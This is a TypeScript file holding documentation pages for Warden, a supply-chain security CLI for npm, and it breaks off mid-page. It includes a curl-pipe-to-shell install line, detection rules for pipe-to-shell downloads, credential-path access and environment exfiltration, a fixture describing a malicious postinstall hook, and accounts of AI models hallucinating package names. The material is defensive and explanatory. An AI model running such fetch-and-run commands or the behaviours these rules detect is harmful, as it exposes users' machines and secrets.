import commands from "./commands.json";

export interface CommandRef {
  name: string;
  description: string;
  positional: { kind: string; values?: readonly string[] } | null;
  flags: Array<{ name: string; description: string; valueHint: string | null }>;
  exitCodes: string;
  example: string;
}

export const COMMANDS = commands as CommandRef[];

export interface DocPage {
  slug: string;
  title: string;
  description: string;
  section: string;
  body: string;
  related?: string[];
}

const gettingStarted = `
Warden installs three binaries and, optionally, shims that put them in front of your existing package manager.

## Install

\`\`\`sh
curl -fsSL https://warden.pulkit.page/install.sh | sh
\`\`\`

Or build from source, which is what the test suite runs against:

\`\`\`sh
git clone https://github.com/pulkitxm/warden
cd warden
make install
bun run build
\`\`\`

That produces \`dist/warden\`, \`dist/wnpm\`, and \`dist/wnpx\`.

## Vet a package before it lands

\`\`\`sh
warden check express@5
warden check left-pad chalk debug --json
\`\`\`

The exit code is the contract: \`0\` allow, \`10\` warn, \`20\` block, \`30\` analysis error. Those four codes are stable and are what CI and agents should branch on.

## Install through Warden

\`\`\`sh
wnpm install express
\`\`\`

Every package is vetted in parallel first. If any verdict is \`block\`, nothing is installed and nothing executes. When the install does proceed it runs with lifecycle scripts disabled.

\`wnpx\` does the same for one-off execution, which is where \`npx\` and \`bunx\` are most dangerous:

\`\`\`sh
wnpx create-some-app
\`\`\`

## Audit what you already have

\`\`\`sh
warden doctor --no-apply
\`\`\`

Doctor audits your direct dependencies against OSV, runs every candidate fix through the same supply-chain engine as \`warden check\`, verifies survivors in an isolated workspace, and applies the recommended plan. Drop \`--no-apply\` to let it write to \`package.json\`.

## Audit the surfaces a package check cannot see

\`\`\`sh
warden check lockfile
warden check scripts
warden check config
\`\`\`

These read your repository rather than a published tarball: where dependencies resolve from, what runs at install time, and which registry your token is sent to.

## Put it in CI

\`\`\`sh
warden ci --reporter github --base origin/main
\`\`\`

## Next

Read [concepts](/docs/concepts) for the model behind the verdicts, then the [CLI reference](/docs/cli).
[Doctor](/docs/doctor) and [intent](/docs/intent) are the two deepest features. [Agents](/docs/agents) covers the machine-readable surface.
## Onboarding an existing repository

Warden can tell you what it is looking at before you change anything.

\`\`\`sh
warden detect
\`\`\`

Classifies the workspace topology, the package manager actually in use, the framework, the role of each package, and the tooling. Every conclusion carries the evidence that produced it, so a wrong answer is debuggable rather than mysterious.

\`\`\`sh
warden init
\`\`\`

Writes the project config, a CI workflow that gates pull requests, and the agent context files that teach a coding agent to plan before it installs. Nothing is overwritten without being shown first, and \`--yes\` accepts every offered change for scripted setup.

\`\`\`sh
warden integrations doctor
warden scripts pending
warden baseline list
\`\`\`

Three commands worth running once on a repository you have just adopted: whether the wiring actually works, which install scripts you inherited, and how much evidence stands behind each package's trusted baseline.

`;

const concepts = `
Warden has a small number of ideas. Everything else is a consequence of them.

## Verdicts, not scores

Every package check produces a **verdict**: \`allow\`, \`warn\`, or \`block\`. A verdict carries a risk score, a category list, evidence, and a summary, but the verdict is the decision. Scores exist to explain a verdict, not to be interpreted by you.

## Exit codes are the API

| Code | Meaning |
| --- | --- |
| \`0\` | allow |
| \`10\` | warn |
| \`20\` | block |
| \`30\` | analysis error |

\`30\` is deliberately distinct from \`20\`. "I could not analyse this" is not the same as "this is malicious", and a CI gate that conflates them either fails open or cries wolf.

## Categories

A verdict names why it fired:

| Category | Meaning |
| --- | --- |
| \`known_malware\` | The exact version is on the compromised-release blocklist |
| \`typosquat\` | The name is a near-miss for a far more popular package |
| \`slopsquat\` | The name matches a known LLM hallucination |
| \`install_script\` | A lifecycle script runs on install |
| \`obfuscation\` | Code is deliberately unreadable |
| \`exfiltration\` | Code reads secrets or the environment and sends them somewhere |
| \`provenance_downgrade\` | A release abandoned the trusted publisher flow the previous one used |
| \`metadata_anomaly\` | Maintainer, repository, or publishing metadata changed suspiciously |

## Static, local, deterministic

Warden never executes package code to analyse it. The engine parses the tarball with an AST scan, compares versions, and checks curated intel. The same input produces the same verdict on your laptop and in CI, and the whole test suite runs offline against a fixture registry.

That is a deliberate trade. Warden will not catch behaviour that only appears at runtime. In exchange it cannot be fooled into running the thing it is judging, and it has no SaaS dependency.

## Gate, then verify

Warden's repair loop refuses to trust its own fix. A candidate upgrade goes through the same engine as any other package. If the officially advised fixed version fails that gate, Warden reports the dependency as **unfixable** rather than upgrading you into a compromised release. Survivors are installed in a throwaway workspace and your own \`test\`, \`typecheck\`, and \`build\` scripts must pass before anything touches your manifest.

This is the difference from \`npm audit fix --force\`, which applies fixes without vetting or verifying them, and from Dependabot, which raises a PR for a version it has not judged.

## Intent

A package check asks "is this dependency safe". Intent asks a different question: **did this diff do what the prompt asked?** It extracts claims from the prompt, matches them against classified diff hunks, and reports dropped requirements, unrequested scope, and calls to APIs that do not exist.

## Next

`;

const doctor = `
Doctor is the repair loop. It audits, gates its own fixes, verifies them in isolation, and only then writes to your manifest.

Two entry points share one core, so flags, report JSON, and exit codes are identical:

\`\`\`sh
warden doctor [--dir <path>] [--json] [--no-apply] [--no-verify]
wnpm doctor   [--dir <path>] [--json] [--no-apply] [--no-verify]
\`\`\`

## The loop

1. **Audit.** Direct dependencies are matched against OSV advisories, the known-malware blocklist, and deprecation metadata.
2. **Gate.** Every candidate fix runs through the same \`checkPackage\` engine as \`warden check\`. A candidate that fails is discarded.
3. **Plan.** Two plans are built: \`minimal\` prefers the smallest in-range upgrade, \`latest\` walks down from the newest safe version.
4. **Verify.** The project is copied to a temporary workspace excluding \`node_modules\`, \`.git\`, \`dist\`, and \`coverage\`. Dependencies install with lifecycle scripts disabled, then your \`test\`, \`typecheck\`, and \`build\` scripts run in that order, stopping at the first failure.
5. **Apply.** The first verified plan is written to \`package.json\` and reinstalled. If that install fails, the original manifest is restored.

## When the fix is the attack

This is the case doctor exists for. Against the offline fixture registry:

\`\`\`term
2 issue(s) found, 2 affect production
  critical  acme-http@1.0.0 [GHSA-ACME-HTTP-0001]
    request smuggling via keep-alive header handling (fixed in 1.0.1)

supply-chain gate on candidate fixes:
  BLOCK acme-http@1.0.1  install_script, exfiltration, provenance_downgrade
    postinstall lifecycle script added (previous version had none);
    code requires child_process; code contains a raw IP address literal.

UNFIXABLE acme-http: every candidate fix was blocked by the supply-chain gate

plan minimal: smallest safe upgrade  ▸ recommended
  acme-json 2.1.0 -> 2.1.4  patch, in range
  verification: install ok 163ms · test ok 205ms (passed)
\`\`\`

The advisory says upgrade to \`1.0.1\`. Warden checked \`1.0.1\`, found a newly added postinstall hook reaching for \`child_process\` and a raw IP, and refused. It reports the dependency as unfixable instead of quietly walking you into it.

Reproduce it yourself with \`make doctor-demo\`, which runs entirely offline.

## Exit codes

\`0\` clean or fully fixed, \`10\` unresolved issues remain, \`30\` error. A run where nothing could be audited exits \`30\` rather than reporting a clean tree it did not earn.

## Degraded behaviour

Registry or OSV failures skip the affected dependency and add a note. A failed advisory lookup treats vulnerabilities as *unknown*, never as *absent*. The report carries \`audited\` and \`skipped\` counts so a partial run is visible.

## Report

\`warden schema doctor\` prints the full JSON Schema. See [agents](/docs/agents) for the machine-readable workflow.
`;

const intent = `
Intent verifies that a diff does what the prompt asked. It is aimed at code an agent wrote.

\`\`\`sh
warden intent check --prompt "add rate limiting to the api client"
warden intent extract --prompt "..."
warden intent diff
warden intent symbols
warden intent schema
\`\`\`

## What it reports

- **Dropped requirements.** A claim in the prompt with no matching change in the diff.
- **Scope creep.** Diff hunks that no claim accounts for.
- **Hallucinated APIs.** Calls to functions and methods that do not exist in the packages actually installed, checked against both a curated surface database and your real \`node_modules\`.

## Exit codes

\`0\` met, \`10\` partial or scope creep, \`20\` a dropped requirement or a hallucinated API, \`30\` error.

## Degradation

Claim extraction can use an LLM when one is configured, including zero-key providers via the Claude or Codex CLI. When no provider is available, or the provider fails, the deterministic passes still run: hunk classification and hallucinated-API detection do not need a model. A failed extraction reports what the static scan found rather than silently reporting success.

## Why this is a supply-chain feature

A hallucinated *API* and a hallucinated *package* are the same failure at different scales. The USENIX Security 2025 study found 19.7% of LLM-recommended packages did not exist, and 43% of those invented names recurred across every rerun. Reliable invention is what makes pre-registration by an attacker worthwhile, which is exactly what happened with \`react-codeshift\`. See [security](/docs/security).
`;

const ci = `
\`warden ci\` is the single command a pull request should run.

\`\`\`sh
warden ci [--reporter <summary|json|github|agent>] [--base <ref>] [--intent-prompt <text>]
\`\`\`

It resolves the merge base, then checks what actually changed.

## What it gates

**Dependency changes.** Every added or changed dependency in a changed \`package.json\` is vetted through the engine.

**Surface changes.** A surface is audited when it appears in the diff:

| Changed file | Audit that runs |
| --- | --- |
| \`package-lock.json\`, \`npm-shrinkwrap.json\`, \`pnpm-lock.yaml\`, \`yarn.lock\` | [lockfile](/docs/check-surfaces) |
| \`package.json\` | [install scripts](/docs/check-surfaces) |
| \`.npmrc\` | [registry config](/docs/check-surfaces) |

This closes a real gap. A pull request that changes no dependency version still passes a version-diff check while repointing where those dependencies resolve from, or adding a \`preinstall\` hook. Surfaces untouched by the diff are not scanned, so the gate stays scoped to the PR.

**Intent**, when a prompt is supplied by \`--intent-prompt\` or \`.warden/prompt.txt\` and the diff touches JavaScript or TypeScript.

The reported verdict is the worst of the three.

## Reporters

- \`summary\` for humans
- \`json\` for a bare finding array
- \`github\` for workflow annotations on the exact file and line
- \`agent\` for a single object carrying findings, intent, verdict, and exit code
- \`sarif\` for GitHub code scanning, uploadable with \`github/codeql-action/upload-sarif\`

Every run also writes \`.warden/last-run.json\`, which is what \`warden handoff\` hands to a coding agent.

## Policy

\`warden.config.json\` can set \`ci.failOn\` to \`warn\` to treat warnings as blocking.

## Workflow

\`\`\`yaml
- uses: oven-sh/setup-bun@v2
- run: curl -fsSL https://warden.pulkit.page/install.sh | sh
- run: warden ci --reporter github --base origin/\${{ github.base_ref }}
\`\`\`

\`warden init\` writes a starting workflow for you.
`;

const agents = `
Warden is built to be driven by a program. Every verb that produces a report supports \`--json\`, every schema is published, and the exit codes are stable.

## The contract

- **JSON on stdout, human text on stderr.** Piping stdout never mixes in prose.
- **Stable exit codes:** \`0\` allow, \`10\` warn, \`20\` block, \`30\` analysis error.
- **Typed error envelopes.** Failures emit \`{"error":{"kind","code","reason","hint"}}\`.
- **No colour when redirected**, and \`--no-color\` forces it off.

## Discover the schemas

\`\`\`sh
warden schema list
# {"schema_version":1,"schemas":["check","ci","audit","doctor","intent"]}

warden schema doctor
\`\`\`

An agent should read the schema rather than pattern-matching on human output.

## The loop

\`\`\`sh
warden detect --json                     # what kind of workspace is this
warden check <pkg> --json                # before installing anything
warden check lockfile --json             # after any dependency edit
warden doctor --json --no-apply          # what is already broken
warden ci --reporter agent               # one object with findings + verdict
warden handoff                               # hand the last failure to an agent
\`\`\`

## Before installing a package

This is the highest-value integration, because it is the step agents skip. Agents check whether a name resolves and install if it does, which is no defense at all against a hallucinated name: there is no collision to detect, because the name is new.

\`\`\`sh
warden check "$PKG" --json || exit $?
\`\`\`

Exit \`20\` means do not install and do not retry with a different flag. It means the name is wrong.

For one-off execution, \`wnpx\` refuses before anything runs:

\`\`\`sh
wnpx some-cli --json
\`\`\`

## Handoff

\`warden handoff\` reads \`.warden/last-run.json\` and produces a bundle for a coding agent, with adapters for Claude, Cursor, Codex, Copilot, Gemini, Aider, and OpenCode. Findings carry both a \`fix\` and a \`verify\` field, so the agent knows the command that proves the fix worked.

## Untrusted text

Strings that came from a registry, a package description, or a maintainer field are data, not instructions. Treat everything under a package's own metadata as untrusted input and never let it steer the agent.

## Setting it up

\`warden init\` writes agent context files alongside the config and workflow.
`;

const security = `
Warden's rules exist because of specific, documented incidents. Every figure below is sourced in the repository's [citations file](https://github.com/pulkitxm/warden/blob/main/research/citations.md).

## The shape of the problem

The CVE Program published **40,077** records in 2024 and **48,244** in 2025. Sonatype counted **454,648** new malicious open-source packages in 2025, and reports that **over 99% of open-source malware is on npm**.

Volume is not the interesting part. The interesting part is that several of these attacks were designed to survive the tools people already run.

## When the fix is the attack

Advisories tell you to upgrade. They do not check whether the version they are recommending is itself safe, and automated bump tooling inherits that blind spot.

Warden's answer is the [doctor](/docs/doctor) gate: a candidate fix is vetted by the same engine as any other package, and a dependency whose only fix fails the gate is reported **unfixable** rather than upgraded.

## Provenance downgrade

The **axios** compromise (March 2026, attributed to Sapphire Sleet, CISA alert April 20) shipped malicious \`1.14.1\` and \`0.30.4\` in a 39-minute window. The only meaningful manifest change against \`1.14.0\` was a single added dependency, which dropped a cross-platform RAT.

The reliable signal was not in the manifest at all. It was that the release abandoned the OIDC trusted-publisher flow the previous release used, in favour of a bare CLI publish from a changed email. Warden reports this as \`provenance_downgrade\`, and calls it out in human output rather than burying it in JSON.

## Install scripts

**Shai-Hulud 2.0**, identified 24 November 2025, was a self-replicating npm worm across **796 packages** and **1,092 versions**, roughly **20M weekly downloads**. It injected \`setup_bun.js\` and \`bun_environment.js\` through a **preinstall** script, having moved from \`postinstall\` in the first version.

Warden disables lifecycle scripts on every install it performs, and [\`warden check scripts\`](/docs/check-surfaces) audits the five install hooks across the installed tree for pipe-to-shell, raw IP endpoints, base64 payloads, credential-path access, and environment exfiltration.

## Lookalike registries

The **chalk / debug** hijack of 8 September 2025 hit **18 packages** with more than **2 billion combined weekly downloads**. The maintainer was phished through **npmjs.help**, a domain registered three days earlier. Malicious versions were live for about two hours.

That domain is exactly why [\`warden check config\`](/docs/check-surfaces) matches registry hosts on brand impersonation rather than raw edit distance. \`registry.npmjs.help\` is four edits from \`registry.npmjs.org\` and would slip past a naive typo check, so Warden matches the \`npmjs\` brand appearing on a host that is not a real registry.

## Lockfile injection

Lockfile tampering is now a documented technique rather than a theoretical one: a PR that changes no version, only a \`resolved\` URL for a transitive dependency, pointed at a registry the attacker controls. Composition analysis reads declared versions, sees nothing, and passes.

**CVE-2026-50021** sharpens this. pnpm skips integrity verification when the \`integrity\` field is *absent* from a lockfile resolution, so deleting a hash is not a neutral edit, it is an exploit precondition. Warden treats a missing integrity hash on a registry tarball as **blocking**, not as a warning.

## Hallucinated packages

The USENIX Security 2025 study by Spracklen et al. tested **576,000** samples across **16 models**: **19.7%** of recommended packages were hallucinations, across **205,474** unique fake names, and **43%** of those names recurred on all ten reruns.

Repeatability is what turns a model error into an attack. In January 2026 **react-codeshift**, a name conflating the real \`jscodeshift\` and \`react-codemod\`, spread to **237 repositories** through a single commit of 47 unreviewed AI-generated skill files, and drew daily download attempts from autonomous agents.

npm's protection against typosquats does not help here. There is no collision to detect, because the name never existed.

## Where Warden sits

Package managers added cooldowns: npm \`min-release-age\` in 11.10.0, pnpm 11's one-day \`minimumReleaseAge\` on by default, plus Yarn and Bun equivalents. npm v12 turns install scripts off by default. These are real improvements that only help people who have upgraded.

Warden sits **above** those per-manager settings, works on older toolchains, and covers what a cooldown cannot: malware that is not new, a CVE fix that is itself malicious, a repointed lockfile, and a package name that never existed.

Read the [gap analysis](https://github.com/pulkitxm/warden/blob/main/research/market-gaps.md) for how each of these maps to a command.
`;

const checkSurfaces = `
\`warden check <pkg>\` reads a published tarball. These three surfaces read *your repository*, where trust is lost without any package changing.

\`\`\`sh
warden check lockfile [--dir <path>] [--json] [--allow-risky]
warden check scripts  [--dir <path>] [--json] [--allow-risky]
warden check config   [--dir <path>] [--json] [--allow-risky]
\`\`\`

No surface check touches the network or executes any code. Exit codes match a package check, and \`warden schema audit\` prints the report shape.

## Lockfile

Reads \`package-lock.json\`, \`npm-shrinkwrap.json\`, \`pnpm-lock.yaml\`, and \`yarn.lock\` (classic and berry). Bun lockfiles are reported as unsupported in \`notes\` rather than treated as clean. One rule table covers every format, so a repointed \`resolved\` URL is caught whichever package manager wrote the file.

| Rule | Level |
| --- | --- |
| \`lockfile_lookalike_registry\` | block |
| \`lockfile_off_registry_host\` | block |
| \`lockfile_insecure_transport\` | block |
| \`lockfile_missing_integrity\` | block |
| \`lockfile_weak_integrity\` | warn |
| \`lockfile_git_dependency\` | warn |
| \`lockfile_file_dependency\` | warn |

## Scripts

Reads the root manifest and every \`node_modules/*/package.json\`, inspecting only hooks npm runs on install: \`preinstall\`, \`install\`, \`postinstall\`, \`prepare\`, \`prepublish\`. A \`build\` or \`test\` script is not an install hook and is not audited.

| Rule | Level |
| --- | --- |
| \`script_pipes_download_to_shell\` | block |
| \`script_raw_ip_endpoint\` | block |
| \`script_base64_payload\` | block |
| \`script_credential_path_access\` | block |
| \`script_env_exfiltration\` | block |
| \`script_inline_node_eval\` | warn |
| \`script_lifecycle_present\` | warn |

If \`node_modules\` is absent, only the root manifest is scanned and a note says so.

## Config

Reads the project \`.npmrc\` and the one in your home directory. **Values are never echoed**, so a leaked token is reported without being reprinted.

| Rule | Level |
| --- | --- |
| \`config_lookalike_registry\` | block |
| \`config_insecure_registry\` | block |
| \`config_plaintext_credential\` | block |
| \`config_tls_verification_disabled\` | block |
| \`config_custom_registry\` | warn |
| \`config_scripts_forced_on\` | warn |

## In CI

[\`warden ci\`](/docs/ci) runs a surface audit when that surface changed in the diff. See [security](/docs/security) for the incidents behind each rule.
`;

const configuration = `
## User config

\`~/.warden/config.json\`, managed through the CLI:

\`\`\`sh
warden config
warden config mode brief
warden config intercept off
warden config agent codex
\`\`\`

\`mode\` is one of \`verbose\`, \`brief\`, \`block\`, or \`log\`. \`intercept\` controls whether the shims vet installs and executions. \`agent\` selects which coding agent [\`warden handoff\`](/docs/cli/fix) hands off to: \`claude\`, \`cursor\`, \`codex\`, \`copilot\`, \`gemini\`, \`aider\`, or \`opencode\`.

## Project config

\`warden.config.json\` at the repository root:

\`\`\`json
{ "ci": { "failOn": "block" } }
\`\`\`

\`ci.failOn\` accepts \`block\` (default) or \`warn\`. With \`warn\`, warnings become blocking in [\`warden ci\`](/docs/ci).

## Global flags

Every verb accepts these:

| Flag | Effect |
| --- | --- |
| \`--json\` | Write the structured report to stdout. Human text stays on stderr. |
| \`--no-color\` | Disable ANSI, the same as setting \`NO_COLOR\`. |
| \`--quiet\` | Suppress the human report. Errors, JSON, and exit codes are unaffected. |
| \`--verbose\` | Print every evidence signal instead of the first six. |
| \`-h\`, \`--help\` | Show help for the verb, including a link to its documentation. |
| \`-v\`, \`--version\` | Print the analyzer version. |

\`--quiet\` is the one to reach for in CI when you only want the exit code, and \`--verbose\` when a verdict looks wrong and you want the full signal list.

## Environment

| Variable | Effect |
| --- | --- |
| \`NO_COLOR\` | Disables ANSI output, same as \`--no-color\` |
| \`WNPM_REGISTRY\` | Registry base URL, used by the offline test registry |
| \`WNPM_DOWNLOADS\` | Download-count endpoint |
| \`WNPM_OSV\` | OSV advisory endpoint |
| \`WNPM_CACHE\` | Verdict cache path, or \`:memory:\` to disable persistence |

## Interception

The installer can place shims ahead of \`npm\`, \`pnpm\`, \`yarn\`, \`bun\`, \`npx\`, and \`bunx\` so installs are vetted without changing how you type. Non-install subcommands pass straight through. Turn it off with \`warden config intercept off\`, and remove everything with \`warden uninstall\`.

## Files Warden writes

| Path | Purpose |
| --- | --- |
| \`~/.warden/config.json\` | User settings |
| \`~/.warden/log.jsonl\` | Verdict log, read by \`warden log\` |
| \`.warden/last-run.json\` | Last CI run, read by \`warden handoff\` |
| \`.warden/prompt.txt\` | Prompt used by [intent](/docs/intent) |
`;

const troubleshooting = `
## A package I trust is blocked

Read the evidence: \`warden check <pkg>\` prints the specific signals. If it is a false positive, \`--allow-risky\` downgrades a block to exit \`10\` for that run, and \`wnpm install --allow-risky\` proceeds. Please also open an issue with the package and version, since false positives are bugs.

## warden check lockfile says my lockfile is unsupported

Warden reads npm-format lockfiles today. \`bun.lock\`, \`yarn.lock\`, and \`pnpm-lock.yaml\` are reported in \`notes\` rather than being treated as clean. This is a known gap and is tracked as the highest-priority parser work.

## check scripts reports nothing

If \`node_modules\` is not installed, only the root manifest can be scanned, and the report says so in \`notes\`. Install dependencies first for a full tree scan.

## Doctor exits 30 on a clean project

Exit \`30\` means the audit could not complete, not that the project is broken. Check \`notes\` in the report: a registry or OSV lookup failure skips a dependency, and a run where nothing at all could be audited exits \`30\` rather than claiming a clean result.

## Doctor pinned an exact version

Applying writes the exact verified version, because that is the version that was gated and verified. Widen the range yourself afterwards if you prefer.

## Intent reports dropped claims that were delivered

Claim matching is heuristic. Narrow the prompt to the change actually being made, or use \`warden intent diff\` and \`warden intent extract\` to see how the diff and prompt were each interpreted.

## CI cannot find a merge base

\`warden ci\` needs the base branch present. In GitHub Actions, check out with enough history and pass \`--base origin/\${{ github.base_ref }}\`.

## Colour codes in my logs

Warden disables colour when stdout is not a TTY. Force it with \`--no-color\` or \`NO_COLOR=1\`.

## Removing Warden

\`\`\`sh
warden uninstall
\`\`\`

Removes the binaries, shims, config, cache, and shell setup.
`;

const schemas = `
Every structured report Warden produces has a published JSON Schema, discoverable at runtime.

\`\`\`sh
warden schema list
# {"schema_version":1,"schemas":["check","ci","audit","doctor","intent"]}
\`\`\`

| Schema | Produced by |
| --- | --- |
| \`check\` | \`warden check <pkg> --json\`, \`wnpm install --json\`, \`wnpx --json\` |
| \`ci\` | \`warden ci --reporter json\` |
| \`audit\` | \`warden check lockfile\|scripts\|config --json\` |
| \`doctor\` | \`warden doctor --json\`, \`wnpm doctor --json\` |
| \`intent\` | \`warden intent check --json\` |

Print any of them:

\`\`\`sh
warden schema doctor
warden schema audit
\`\`\`

## Stability

\`schema_version\` is present on every report. The verdict fields (\`schema_version\`, \`package\`, \`version\`, \`integrity\`, \`verdict\`, \`risk_score\`, \`categories\`, \`summary\`, \`evidence\`, \`analyzer_version\`, \`source\`) and the four exit codes are stable contracts. They will not change without a version bump and migration notes.

Agents should read these schemas rather than parsing human output. See [agents](/docs/agents).
`;


const transactions = `
A package name is not a dependency change. Typing \`npm install @fastify/jwt\` adds one name to a manifest and, moments later, an entire resolved subgraph to \`node_modules\`. Vetting only the name that was typed leaves every transitive addition unexamined, and a transitive addition is exactly where a compromised release hides.

Warden treats the whole change as one transaction: plan, approve, apply, verify, receipt.

## Plan

\`\`\`sh
warden plan -- npm install @fastify/jwt
warden plan
warden plan --json -- pnpm add zod
\`\`\`

Planning resolves the complete prospective graph from registry metadata, direct and transitive. Nothing is downloaded, unpacked, or executed to build it. The graph is diffed against the one in your lockfile, and every added or changed package goes through the same engine as \`warden check\`.

\`\`\`text
WARDEN PLAN  npm install @fastify/jwt

Direct changes
  + @fastify/jwt 9.1.0

Graph changes
  + 7 transitive packages
  ~ 2 existing packages resolved to a different version
  - 0 packages no longer required
  = 214 unchanged

Execution surface
  1 changed packages carry an install script
  1 of those are new relative to the current graph
  1 platform-specific artifacts will be added
  0 requirements did not resolve from the registry

Analysis coverage
  9 of 9 changed packages analyzed (100%)

Decision: NEEDS_APPROVAL
  fast-jwt@5.0.6 has a postinstall script

Next action
  warden approve-script fast-jwt@5.0.6 --hook postinstall --plan wtxn_0a1b2c3d
\`\`\`

## The decision

| Decision | Exit | Meaning |
| --- | --- | --- |
| \`ALLOW\` | 0 | Every changed package was analyzed and none raised a finding. |
| \`WARN\` | 10 | Findings worth reading, but nothing that stops the change. |
| \`NEEDS_APPROVAL\` | 10 | New install scripts, a truncated graph, or packages left unanalyzed. |
| \`BLOCK\` | 20 | A changed package is malicious or unanalyzable, or a requirement did not resolve. |
| error | 30 | The transaction could not be planned at all. |

\`NEEDS_APPROVAL\` exists so incomplete coverage is never reported as safety. Every plan carries a \`coverage\` object naming how many changed packages were actually analyzed, and a truncated or partially analyzed plan cannot reach \`ALLOW\`.

## Narrow approvals

\`\`\`sh
warden approve-script esbuild@0.25.8 --hook postinstall
warden approve-script sharp@0.33.5 --hook install --scope user
\`\`\`

An approval binds the package name, the exact version, the tarball integrity, the hook, and a hash of the normalized script body. Change any one of those and it no longer applies. Repo approvals live in \`.warden/approvals.json\` and are meant to be committed, so a decision reviewed once covers the whole team.

This replaces the pattern of a single broad override. A bypass scoped to exactly what was reviewed can be audited later; one that means "allow risk" cannot.

## Apply

\`\`\`sh
warden apply wtxn_0a1b2c3d
\`\`\`

Applying refuses a blocked plan outright, refuses while any new install script is unapproved, installs through your own package manager with lifecycle scripts suppressed by that manager's native mechanism, runs your \`test\`, \`typecheck\`, and \`build\` scripts in that order, restores \`package.json\` on any failure, and writes a receipt.

Scripts stay suppressed for the entire install, including for approved packages. Approval governs whether the transaction may proceed, not whether Warden hands execution to package code mid-install.

## Verify

\`\`\`sh
warden verify
warden ci --require-transaction-receipt
\`\`\`

The receipt records both graph digests, the policy digest, every artifact verdict, every approval, every suppressed script, and the verification result. \`warden verify\` compares the graph digest of the committed lockfile against the one the receipt was issued for.

This is the honest answer to the fact that PATH shims can be bypassed. The local shim is convenience. CI receipt verification is the control that catches a developer or an agent installing outside Warden, without pretending the shim was ever a sandbox.

See [command coverage](/docs/coverage) for exactly which commands the shim mediates, and [limitations](/docs/limitations) for what none of this covers.
`;

const policy = `
Package managers have grown real security controls of their own. npm has script approvals, source restrictions, and a release age gate. pnpm 11 has build allowlists, a one-day default \`minimumReleaseAge\`, \`trustPolicy\`, and \`blockExoticSubdeps\`. Yarn disables dependency postinstalls by default from 4.14 and has hardened mode. Bun runs nothing outside \`trustedDependencies\`.

Warden does not duplicate them. It compiles one manager-neutral policy into the strongest primitive each manager actually has, and states plainly what a given manager cannot express.

## The policy

\`\`\`json
{
  "policy": {
    "scripts": "approved",
    "minimumReleaseAgeDays": 1,
    "exoticSources": "block",
    "lockfile": "reverify",
    "downgrades": "block"
  }
}
\`\`\`

This lives under \`policy\` in \`warden.config.json\`. Anything you leave out inherits the default shown above.

## What each manager can enforce

| Intent | npm | pnpm | Yarn | Bun |
| --- | --- | --- | --- | --- |
| Deny dependency scripts | \`ignore-scripts\` | \`strictDepBuilds\`, \`allowBuilds\` | \`enableScripts\` | \`install.ignoreScripts\` |
| Minimum release age | \`min-release-age\` (days) | \`minimumReleaseAge\` (minutes) | \`npmMinimalAgeGate\` (duration) | Warden |
| Block git and url sources | \`allow-git\`, \`allow-remote\`, \`allow-directory\`, \`allow-file\` | \`blockExoticSubdeps\` | Warden | Warden |
| Re-verify the lockfile | Warden | \`trustLockfile\` | \`enableHardenedMode\` | Warden |
| Block semver downgrades | Warden | Warden | Warden | Warden |

Each manager names and types these differently, and the compiler follows the manager rather than a house style. npm counts release age in days, pnpm in minutes, Yarn takes a duration string such as \`1d\`. npm's source settings take \`all\`, \`none\`, or \`root\` rather than a boolean. pnpm's \`trustPolicy: no-downgrade\` covers provenance evidence weakening rather than semantic versions, so a semver downgrade is reported as a gap Warden covers itself. Bun ships a default trusted list, so \`trustedDependencies\` alone is not deny-all.

## Compiling

\`\`\`sh
warden policy
warden policy --manager pnpm
warden policy --json
\`\`\`

\`\`\`text
Policy compiled for bun

  Native settings
    package.json           trustedDependencies = []
      bun runs no dependency lifecycle script outside this list

  Not natively supported
    enforce a minimum release age
      bun has no native setting; warden enforces this itself

  Enforced by warden regardless
    every added or changed package is vetted before the install runs
    install scripts require an approval bound to version, integrity, hook, and script body
    a release younger than 1 day(s) is reported as a risk
\`\`\`

Compiling prints the settings; it does not write them into your config files. What to change is your decision, and those files usually carry unrelated settings.

Whatever a manager cannot enforce, the plan, the approval model, and the CI receipt gate still cover.
`;

const limitations = `
A security tool earns trust by being explicit about its boundary. Everything below is a real limit of what Warden does today.

## PATH shims are not a sandbox

The installer places shims in front of \`npm\`, \`pnpm\`, \`yarn\`, \`bun\`, \`npx\`, and \`bunx\`. That is a convenience mechanism, not an operating-system control. Each of these bypasses it, and each is listed rather than quietly ignored:

- calling a package manager by its absolute path
- a container or CI image where the shims are not installed
- a remote agent or build machine outside your shell
- Corepack resolving a manager binary directly
- a shell script that downloads and runs code without any package manager involved

Run \`warden coverage\` for the full matrix of what is mediated, and \`warden integrations doctor\` to check that the shims are actually in front of your tools on this machine. When a shim does mediate a command, it gates the whole prospective graph rather than only the package names you typed, so a malicious transitive dependency is caught at the same point a direct one is.

The backstop for all of it is CI: \`warden ci --require-transaction-receipt\` fails a pull request whose dependency graph changed without a receipt that verifies against the committed lockfile. That check does not depend on anything having worked locally.

## Analysis has limits

- Static analysis reads JavaScript and TypeScript. A native binary, a WebAssembly module, or a compiled artifact is not analyzed the way source is. Every verdict built from a tarball reports an artifact inventory naming how many files were read as source and what was not, so an allow never implies the whole package was understood.
- Sufficiently determined obfuscation can hide behaviour from an AST scan. Warden treats heavy obfuscation as a signal in itself, which is a heuristic, not a proof.
- Warden evaluates risk signals and policy. It cannot prove that code is safe. An allow means no rule fired, not that the package is trustworthy.

## Resolution has limits

- Graph resolution is flat: one version per package name. That matches how a hoisting installer usually lands, but a real installer can nest two versions of the same package where Warden reports a conflict instead.
- Git, URL, file, link, workspace, and portal ranges are outside registry resolution. They are reported as unresolved rather than trusted.
- Resolution stops at a node budget and analysis stops at a check budget. Both are reported on the plan, and either one prevents a confident allow.
- The plan describes what the resolver believes will happen. Your package manager remains the thing that actually installs.

## Baselines and history

A delta is measured against a trusted baseline, resolved in order of evidence: an explicitly recorded version, then the version a verified transaction installed, then the version in your lockfile, then, only as a last resort, the previous published release. That last case is genuinely weak, because an attacker who publishes twice moves it along with them, and \`warden baseline list\` grades it as such rather than hiding it.

## Scores

The 0 to 100 number is a weighted sum of heuristic signals. It is labelled a heuristic score everywhere it appears, and it is deliberately not the headline. The decision, the confidence, and the reason code are the parts to act on. The score has not been calibrated against a published benchmark corpus.

## Model use

A model can help extract claims from a prompt and rank alternatives. No model decides a block. The enforcement core is deterministic, and every model-assisted step reports when it degraded to the deterministic path.

Instructions, skills, and MCP tools improve how well an agent cooperates with Warden. They are not enforcement by themselves; an agent that ignores them is caught by the shim, and an agent that bypasses the shim is caught in CI.
`;


const coverage = `
A security tool earns trust through verifiable coverage, not through a claim. Every row below comes from the same command grammar the shim consults at runtime, so this page cannot drift from behaviour. Run \`warden coverage --json\` to get the same matrix from the binary you have installed.

## What the categories mean

